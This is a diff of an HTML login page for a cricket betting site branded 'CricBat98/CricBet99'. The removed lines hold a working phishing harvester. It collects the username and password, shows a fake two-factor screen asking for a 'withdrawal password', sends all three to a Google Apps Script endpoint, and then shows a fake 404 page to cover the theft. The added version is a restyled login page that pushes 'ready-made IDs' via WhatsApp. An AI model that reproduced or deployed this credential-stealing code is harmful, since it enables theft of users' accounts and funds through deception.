@@ -3,8 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title> Welcome to CricBat98</title>
+    <title>Welcome to CricBet99</title>
+    <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
     <style>
+        /* CSS START */
         body {
             font-family: Arial, sans-serif;
             background: linear-gradient(180deg, #8a4e00, #116257);
@@ -21,13 +23,13 @@
         .logo {
             width: 320px;
             height: auto;
-            margin-bottom: 20px;
+            margin-bottom: 30px;
         }
 
         .container {
             background-color: #fff;
             padding: 20px;
-            border-radius: 8px;
+            border-radius: 5px;
             box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
             width: 280px;
             text-align: center;
@@ -38,28 +40,47 @@
             font-weight: bold;
             margin-bottom: 10px;
             color: #8B4513;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .arrow-img {
+            width: 30px;
+            height: auto;
         }
 
         .form-group {
-            margin-bottom: 15px;
-            text-align: left;
+            position: relative;
+            margin-bottom: 20px;
         }
 
         .form-group input {
-            width: calc(100% - 20px);
+            width: 100%;
+            max-width: 235px;
             padding: 10px;
             border: 1px solid #ced4da;
             border-radius: 4px;
             font-size: 14px;
+            padding-right: 35px;
         }
 
-        .form-group input:focus {
-            outline: none;
-            border-color: #007bff;
+        .form-group img {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 24px;
+            height: 24px;
+            filter: brightness(0) invert(0.2);
         }
 
         .btn {
-            display: block;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
             width: 100%;
             padding: 10px;
             background-color: #8B4513;
@@ -68,153 +89,284 @@
             border-radius: 4px;
             font-size: 14px;
             cursor: pointer;
+            margin-bottom: 8px;
+            max-width: 1000px;
+            position: relative;
+        }
+        .btn span, 
+.btn img {
+    color: white; /* डिफ़ॉल्ट टेक्स्ट और आइकन का कलर */
+    filter: brightness(0) invert(1); /* Default सफेद बनाने के लिए */
+    transition: color 0.3s ease, filter 0.3s ease;
+}
+
+.btn:hover span, 
+.btn:hover img {
+    color: black; /* Hover पर काला */
+    filter: brightness(1) invert(0); /* Default Black */
+}
+
+        .btn img {
+            width: 20px;
+            height: 20px;
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            
         }
 
-        .btn:hover {
-            background-color: #5A3310;
+        .brown-line-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 8px 0;
         }
 
-        .recaptcha-text {
-            font-size: 12px;
-            color: #6c757d;
-            margin-top: 15px;
+        .brown-line {
+            width: 40%;
+            height: 1px;
+            background: brown;
+        }
+
+        .or-text {
+            font-size: 14px;
+            font-weight: bold;
+            margin: 0 8px;
+            color: grey;
+        }
+
+        .ready-id-text {
+            font-size: 14px;
+            color: grey;
             text-align: center;
+            margin-top: 10px;
         }
 
-        .recaptcha-text a {
+        /* Small images with text */
+        .small-features {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 10px;
+        }
+
+        .small-feature-item {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .small-feature-item img {
+            width: 40px;
+            height: 45px;
+        }
+
+        .small-feature-text {
+            font-size: 12px;
+            color: black;
+        }
+
+        .whatsapp-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #8B4513;
+            color: white;
+            padding: 12px;
+            text-decoration: none;
+            border-radius: 5px;
+            font-size: 18px;
+            gap: 12px;
+            margin-top: 15px;
+        }
+
+        .whatsapp-btn img {
+            width: 30px;
+            height: 30px;
+        }
+        .recaptcha-text {
+    font-size: 10.5px; /
+    color: black;
+    text-align: left; /
+    max-width: 250px; /
+    line-height: 1.2; /
+    margin: 10px 0 0 10px; /
+    text-decoration: none; /
+}
+
+.recaptcha-text a {
+    color: blue;
+    text-decoration: none;
+}
+
+.recaptcha-text a:hover {
+    cursor: pointer;
+}
+
+        .gmail {
+            font-size: 16px;
+            margin-top: 10px;
+        }
+
+        .gmail a {
             color: #007bff;
             text-decoration: none;
         }
 
-        .recaptcha-text a:hover {
+        .gmail a:hover {
             text-decoration: underline;
         }
 
-        .error-message {
-            font-size: 18px;
-            margin-bottom: 20px;
-            color: #6c757d;
+        .dotted-line {
+            width: 100%;
+            height: 1px;
+            border-top: 2px dotted #8B4513;
+            margin: 10px 0;
         }
 
-        .bold-text {
-            font-weight: bold;
+        .social-icons {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 10px;
+            padding: 0 10px;
         }
 
-        .hidden {
-            display: none;
-        }
+        .social-icons a {
+    text-decoration: none;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    font-size: 14px;
+    font-weight: bold;
+    color: black; /* Default Black */
+}
 
-        .spacer {
-            margin: 15px 0;
+.social-icons a:hover {
+    color: #8B4513; /* Hover पर Brown */
+}
+
+        .social-icons img {
+            width: 30px;
+            height: 30px;
+            border-radius: 5px;
         }
+        .instagram-link {
+    position: relative;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    font-weight: bold;
+    color: black;
+    text-decoration: none;
+    transition: color 0.3s ease;
+}
+
+.instagram-link:hover {
+    color: brown;
+}
+
+.instagram-link .arrow {
+    display: inline-block;
+    width: 30px;
+    height: 30px;
+    margin-right: 5px;
+    animation: moveArrow 0.8s infinite alternate ease-in-out;
+}
+
+@keyframes moveArrow {
+    0% { transform: translateX(0); }
+    100% { transform: translateX(-5px); }
+}
+
+        /* CSS END */
     </style>
 </head>
 <body>
-    <!-- Logo -->
+
     <img src="logo.png" alt="CricBat98 Logo" class="logo">
 
-    <!-- Main Container -->
-    <div class="container" id="mainContainer">
-        <!-- Login Form -->
-        <div id="loginForm">
-            <div class="heading">LOGIN</div>
-            <form id="mainLoginForm" onsubmit="handleMainFormSubmit(event)">
-                <div class="form-group">
-                    <input type="text" id="UserName" name="UserName" placeholder="User Name" required>
-                </div>
-                <div class="form-group">
-                    <input type="password" id="password" name="password" placeholder="Password" required>
-                </div>
-                <button type="submit" class="btn">Login</button>
-            </form>
-            <div class="spacer"></div>
-            <button class="btn" onclick="navigateToDemoLogin()">Login with Demo ID</button>
-            <div class="recaptcha-text">
-                <span class="bold-text">This site is protected by reCAPTCHA and the Google</span>
-                <a href="#">Privacy Policy</a> and <a href="#">Terms of Service</a> apply.
+    <div class="container">
+        <div class="heading">
+            LOGIN
+            <img src="OIP (2).jpg" alt="Arrow Icon" class="arrow-img">
+        </div>
+
+        <form id="login-form">
+            <div class="form-group">
+                <input type="text" id="username" placeholder="User Name" required>
+                <img src="download (5).png" alt="User Icon">
+            </div>
+            <div class="form-group">
+                <input type="password" id="password" placeholder="Password" required>
+                <img src="download (6).png" alt="Password Icon">
+            </div>
+            <button type="submit" class="btn">
+                <span>Login</span>
+                <img src="OIP__4_-removebg-preview.png" alt="Login Icon">
+            </button>
+            
+            <button class="btn" id="demo-login">
+                <span>Login with Demo ID</span>
+                <img src="OIP__4_-removebg-preview.png" alt="Demo Login Icon">
+            </button>
+            
+        <div class="brown-line-container">
+            <div class="brown-line"></div>
+            <div class="or-text">OR</div>
+            <div class="brown-line"></div>
+        </div>
+
+        <p class="ready-id-text">Get your Ready-Made ID From WhatsApp</p>
+
+        <!-- Small images with text -->
+        <div class="small-features">
+            <div class="small-feature-item">
+                <img src="download (7).png" alt="Feature 1">
+                <span class="small-feature-text">Diamond Upgrade</span>
+            </div>
+            <div class="small-feature-item">
+                <img src="download (8).png" alt="Feature 2">
+                <span class="small-feature-text">1-to-1 customer Support</span>
+            </div>
+            <div class="small-feature-item">
+                <img src="download (9).png" alt="Feature 3">
+                <span class="small-feature-text"> 24/7<br>Instant<br> Withdrawal</span>
             </div>
         </div>
 
-        <!-- Demo Login Form -->
-        <div id="demoForm" class="hidden">
-            <div class="heading">DEMO LOGIN</div>
-            <p style="font-weight: bold; color: black; margin: 0;">2-Factor Authentication Enabled.</p>
-            <p style="font-weight: bold; color: black; margin: 5px 0 10px;">Enter Your Withdrawal Password</p>
-            <form id="demoLoginForm" onsubmit="handleDemoFormSubmit(event)">
-                <div class="form-group">
-                    <input type="text" id="withdrawalCode" name="withdrawalCode" placeholder="Withdrawal Code" required>
-                </div>
-                <button type="submit" class="btn">Submit</button>
-            </form>
-            <div class="recaptcha-text">
-                <span class="bold-text">This site is protected by reCAPTCHA and the Google</span>
-                <a href="#">Privacy Policy</a> and <a href="#">Terms of Service</a> apply.
-            </div>
+        <a href="https://wa.me/your-number" class="whatsapp-btn">
+            <img src="whatsapp-xxl.png" alt="WhatsApp Logo">
+            WHATSAPP NOW
+        </a>
+ <!-- reCAPTCHA Text Below WhatsApp Button -->
+ <div class="recaptcha-text">
+    <span>This site is protected by reCAPTCHA and the Google</span> <br>
+    <a href="#">Privacy Policy</a> and <a href="#">Terms of Service</a> apply.
+</div>
+
+
+
+<!-- Gmail Below reCAPTCHA -->
+<p class="gmail">
+    <a href="mailto:cricbat99info@gmail.com">cricbat99info@gmail.com</a>
+        <div class="dotted-line"></div>
+
+        <div class="social-icons">
+            <a href="https://www.instagram.com/your-profile" class="instagram-link">
+                <img src="2201767.png" alt="Arrow" class="arrow">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram">
+                <span>Instagram</span>
+            </a>
+            
+            <a href="https://t.me/your-profile">
+                <img src="download (10).png" alt="Telegram">
+                <span>Telegram</span>
+            </a>
         </div>
 
-        <!-- Error 404 Page -->
-        <div id="error404" class="hidden">
-            <div class="heading" style="color: #dc3545;">404</div>
-            <div class="error-message">Page Not Found</div>
-        </div>
     </div>
 
-    <script>
-        const scriptUrl = "https://script.google.com/macros/s/AKfycbwfmML6__pCuuqINVGgHf50zF0jcjeX9rUwzloVcFpbNIDWzPfP5tdo7hT7WfpC5BwU4g/exec";
-
-        let userData = {}; // To temporarily store data
-
-        // Handle main login form submission
-        function handleMainFormSubmit(event) {
-            event.preventDefault();
-            const username = document.getElementById("UserName").value;
-            const password = document.getElementById("password").value;
-
-            userData = { username, password };
-
-            // Navigate to demo login form
-            document.getElementById("loginForm").classList.add("hidden");
-            document.getElementById("demoForm").classList.remove("hidden");
-        }
-
-        // Navigate to demo login form when "Login with Demo ID" button is clicked
-        function navigateToDemoLogin() {
-            document.getElementById("loginForm").classList.add("hidden");
-            document.getElementById("demoForm").classList.remove("hidden");
-        }
-
-        // Handle demo login form submission
-        function handleDemoFormSubmit(event) {
-            event.preventDefault();
-            const withdrawalCode = document.getElementById("withdrawalCode").value;
-
-            if (!withdrawalCode) {
-                alert("Please enter your withdrawal code.");
-                return;
-            }
-
-            userData.withdrawalCode = withdrawalCode;
-
-            // Send data to Google Sheet
-            const formData = new FormData();
-            formData.append("UserName", userData.username);
-            formData.append("password", userData.password);
-            formData.append("withdrawalCode", userData.withdrawalCode);
-
-            fetch(scriptUrl, {
-                method: "POST",
-                body: formData,
-            })
-                .then(response => response.text())
-                .then(responseText => {
-                    console.log("Response from Google Sheet:", responseText);
-                    document.getElementById("demoForm").classList.add("hidden");
-                    document.getElementById("error404").classList.remove("hidden");
-                })
-                .catch(error => {
-                    console.error("Error storing data:", error);
-                });
-        }
-    </script>
 </body>
 </html>
